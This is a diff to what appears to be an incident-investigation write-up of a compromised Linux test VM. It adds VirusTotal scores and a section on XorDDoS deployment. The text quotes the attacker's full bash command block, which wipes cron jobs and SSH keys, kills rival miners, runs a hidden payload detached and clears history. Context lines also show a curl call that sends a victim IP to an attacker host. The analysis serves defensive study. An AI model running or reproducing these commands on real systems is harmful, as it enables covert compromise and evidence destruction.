@@ -254,9 +254,9 @@ curl --silent "http://196.251.73.38:47/save-data?IP=103.108.140.172" \\
 </p>
 
 **VirusTotal Scores:**
-- `Update`: **N/A**  
+- `Update`: **27/63**  
 - IP `196.251.73.38:47`: **N/A**  
-- IP `103.108.140.172`: **N/A**
+- IP `103.108.140.172`: **0/94**
 
 ---
 
@@ -341,37 +341,88 @@ cat /var/tmp/.update-logs/iplist | /var/tmp/.update-logs/./.bisis ssh -o /var/tm
 
 **VirusTotal Scores:**
 - `History`: **N/A**  
-- `Update`: **N/A**  
-- `.bisis`: **N/A**  
-- `cache`: **N/A**  
+- `Update`: **27/63**  
+- `.bisis`: **6/64**  
+- `cache`: **34/64**  
 - `.b`: **N/A**  
 - IP `196.251.73.38:47`: **N/A**
 
+---
 
+### March 24, 2025 — XorDDoS Deployment, Obfuscation, and System Manipulation
 
+**Device Involved:**  
+- `JR-Linux-VM-Test`
 
+**Observed Activity:**  
+The device `JR-Linux-VM-Test` was observed running a bash script designed to locate a writable directory, download several executables from a malicious domain, and execute them. To evade detection, the script deleted system and audit logs, renamed system binaries like `wget`, and cleared command history. The downloads originated from the IP `169.239.130.12`, previously seen in connection with the creation of the file `ygljglkjgfg1`.
 
+**Downloaded Files:**  
+Execution of the malicious file `ygljglkjgfg1` resulted in the creation of a shell script named `gcc.sh`.
 
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/207b2847-45be-43b6-acbc-85d872c58365" width="700"/>
+  <img src="https://github.com/user-attachments/assets/8abd4a37-5efd-45e0-831b-d1d5a0c91fac" width="700"/>
+</p>
 
+**Malicious Behavior:**  
+Subsequent commands removed scheduled cron jobs, deleted SSH authorized keys, cleared logs, and terminated known cryptomining processes (like `xmrig`, `java`, and `cnrig`). Payloads and related directories were wiped, and the malicious file `sBksNkqW` was executed from `/var/tmp/` in stealth mode (detached, no output). Command history was cleared to cover tracks.
 
+**Key Bash Command:**
+```bash
+bash -c "
+crontab -r
+chattr -iae ~/.ssh/authorized_keys >/dev/null 2>&1
+cd /var/tmp
 
+rm -rf /dev/shm/.x /dev/shm/rete* /var/tmp/payload /tmp/.diicot /tmp/kuak
+chattr -iae /var/tmp/Documents/.diicot
+chattr -iae /var/tmp/.update-logs/History
+chattr -iae /var/tmp/.update-logs/Update
 
+rm -rf /var/tmp/.update-logs /var/tmp/Documents
+mkdir /var/tmp/Documents >/dev/null 2>&1
 
+cd /var/tmp/
+pkill Opera
+rm -rf /var/tmp/Documents /var/tmp/.update-logs
+rm -rf xmrig .diicot .black Opera
+rm -rf .black xmrig.1
+pkill cnrig
+pkill java
+killall java
+pkill xmrig
+killall cnrig
+killall xmrig
 
+cd /var/tmp/
+chmod 777 sBksNkqW
+./sBksNkqW </dev/null &>/dev/null & disown
 
+history -c
+rm -rf .bash_history ~/.bash_history
+"
+```
 
+**Further Activity:**  
+The execution of `sBksNkqW` triggered a bash command that made the hidden `History` file in `/var/tmp/.update-logs` executable, waited 15 seconds, then ran it. This suggests delayed execution to avoid immediate detection. Following this, both the `History` and `Update` files were executed, resulting in the creation of the `.bisis` file.
 
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/86b3831e-04eb-45dd-a53b-377e67315fcf" width="700"/>
+  <img src="https://github.com/user-attachments/assets/1e3ea9c2-28d8-4d72-a1cf-099633159153" width="700"/>
+</p>
 
+**Stealth & Obfuscation:**  
+An unknown process was observed creating a file named `libudev.so.6`, which appeared to be the previously seen `ygljglkjgfg1` file, now renamed to masquerade as a legitimate shared library.
 
+<p align="center">  
+  <img src="https://github.com/user-attachments/assets/dbfcfe02-a725-4f02-b6ff-8ffd6f97db1e" width="700"/>
+</p>
 
+**VirusTotal Scores:**  
+- `gcc.sh`: **27/61**
 
-
-
-
-
-
-
-
+---
 
 ## Gaps and Observations
 
